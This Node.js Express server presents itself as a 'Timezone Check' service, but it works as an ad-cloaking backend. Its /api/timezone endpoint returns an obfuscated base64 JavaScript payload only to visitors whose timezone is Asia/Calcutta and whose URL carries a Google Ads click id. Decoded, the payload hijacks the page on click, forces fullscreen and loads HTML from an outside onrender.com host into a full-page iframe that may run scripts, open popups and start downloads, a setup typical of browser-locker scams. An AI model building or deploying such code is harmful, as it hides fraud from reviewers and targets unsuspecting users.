const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors'); // Import cors

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse JSON bodies
app.use(bodyParser.json());

// Enable CORS and restrict it to http://localhost:3000
app.use(cors());
// Serve the HTML file
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Timezone Check</title>
    </head>
    <body>
        <h1>Welcome to Website B</h1>
        <p>This server checks the timezone and URL parameters.</p>
    </body>
    </html>
    `);
});

// Endpoint to receive data from website A
app.post('/api/timezone', (req, res) => {
    const { timezone, fullUrl } = req.body;

    // Check if the request body is valid
    if (!req.body || !timezone || !fullUrl) {
        return res.status(400).send('Invalid request body.');
    }

    console.log(`Received timezone: ${timezone}, fullUrl: ${fullUrl}`);

    // Check if the timezone is Asia/Calcutta
    const isTimezoneJapan = timezone === 'Asia/Calcutta';

    // Check if the URL contains 'gclid'
    const containsGclid = fullUrl.includes('gclid');

    // Base64 code to send in response
    const base64Code = 'CmRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5zdHlsZS5vdmVyZmxvdyA9ICJoaWRkZW4iOwpkb2N1bWVudC5ib2R5Lmluc2VydEFkamFjZW50SFRNTCgiYWZ0ZXJiZWdpbiIsIAogICAgJzxkaXYgaWQ9ImJydWNlRGl2IiBzdHlsZT0iei1pbmRleDogOTk5OTsgcG9pbnRlci1ldmVudHM6IGF1dG87IG92ZXJmbG93OiBoaWRkZW47Ij48L2Rpdj4nCik7CgovLyBBZGQgYSBjbGljayBldmVudCBsaXN0ZW5lciB0byB0cmlnZ2VyIGZ1bGxzY3JlZW4gYW5kIGZldGNoIGV4dGVybmFsIEhUTUwKZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBmdW5jdGlvbigpIHsKICAgIHdpbmRvdy5zY3JvbGxUbygwLCAwKTsKICAgIHNldFRpbWVvdXQoKCkgPT4gewogICAgICAgIGlmIChkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQucmVxdWVzdEZ1bGxzY3JlZW4pIHsKICAgICAgICAgICAgZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LnJlcXVlc3RGdWxsc2NyZWVuKCk7CiAgICAgICAgfSBlbHNlIGlmIChkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQubW96UmVxdWVzdEZ1bGxTY3JlZW4pIHsKICAgICAgICAgICAgZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50Lm1velJlcXVlc3RGdWxsU2NyZWVuKCk7CiAgICAgICAgfSBlbHNlIGlmIChkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQud2Via2l0UmVxdWVzdEZ1bGxzY3JlZW4pIHsKICAgICAgICAgICAgZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LndlYmtpdFJlcXVlc3RGdWxsc2NyZWVuKCk7CiAgICAgICAgfSBlbHNlIGlmIChkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQubXNSZXF1ZXN0RnVsbHNjcmVlbikgewogICAgICAgICAgICBkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQubXNSZXF1ZXN0RnVsbHNjcmVlbigpOwogICAgICAgIH0KICAgIH0sIDEwMCk7CgogICAgLy8gRmV0Y2ggSFRNTCBmcm9tIHRoZSBuZXcgVVJMIGFuZCBlbWJlZCBpdCBpbiBhbiBpZnJhbWUKICAgIGZldGNoKCJodHRwczovL3R3bzJnLm9ucmVuZGVyLmNvbSIpCiAgICAgICAgLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKQogICAgICAgIC50aGVuKGNvbnRlbnQgPT4gewogICAgICAgICAgICBsZXQgYmxvYiA9IG5ldyBCbG9iKFtjb250ZW50XSwgeyB0eXBlOiAidGV4dC9odG1sIiB9KTsKICAgICAgICAgICAgbGV0IHVybCA9IFVSTC5jcmVhdGVPYmplY3RVUkwoYmxvYik7CiAgICAgICAgICAgIGxldCBpZnJhbWUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpZnJhbWUiKTsKICAgICAgICAgICAgaWZyYW1lLnNyYyA9IHVybDsKICAgICAgICAgICAgaWZyYW1lLnN0eWxlLndpZHRoID0gIjEwMCUiOwogICAgICAgICAgICBpZnJhbWUuc3R5bGUuaGVpZ2h0ID0gIjEwMCUiOwogICAgICAgICAgICBpZnJhbWUuZnJhbWVCb3JkZXIgPSAiMCI7CiAgICAgICAgICAgIGlmcmFtZS5zZXRBdHRyaWJ1dGUoImFsbG93ZnVsbHNjcmVlbiIsICIiKTsKICAgICAgICAgICAgaWZyYW1lLnNldEF0dHJpYnV0ZSgid2Via2l0YWxsb3dmdWxsc2NyZWVuIiwgIiIpOwogICAgICAgICAgICBpZnJhbWUuc2V0QXR0cmlidXRlKCJtb3phbGxvd2Z1bGxzY3JlZW4iLCAiIik7CiAgICAgICAgICAgIGlmcmFtZS5zYW5kYm94ID0gImFsbG93LXNjcmlwdHMgYWxsb3ctcG9wdXBzIGFsbG93LWRvd25sb2FkcyI7CiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJicnVjZURpdiIpLmFwcGVuZENoaWxkKGlmcmFtZSk7CiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJicnVjZURpdiIpLnN0eWxlLmhlaWdodCA9ICIxMDB2aCI7CiAgICAgICAgfSkKICAgICAgICAuY2F0Y2goZXJyb3IgPT4gewogICAgICAgICAgICBjb25zb2xlLmVycm9yKCJFcnJvciBmZXRjaGluZyB0aGUgSFRNTDoiLCBlcnJvcik7CiAgICAgICAgfSk7Cn0sIHsgb25jZTogdHJ1ZSB9KTsKOw==
'; // Your base64 string here

    // If both conditions are met, respond with the base64 code
    if (isTimezoneJapan && containsGclid) {
        console.log(`Response sent: ${base64Code}`);
        return res.status(200).send(base64Code); // Send the base64 string directly
    } else {
        const responseMessage = 'Conditions not met.';
        console.log(responseMessage);
        return res.status(200).send(responseMessage);
    }
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
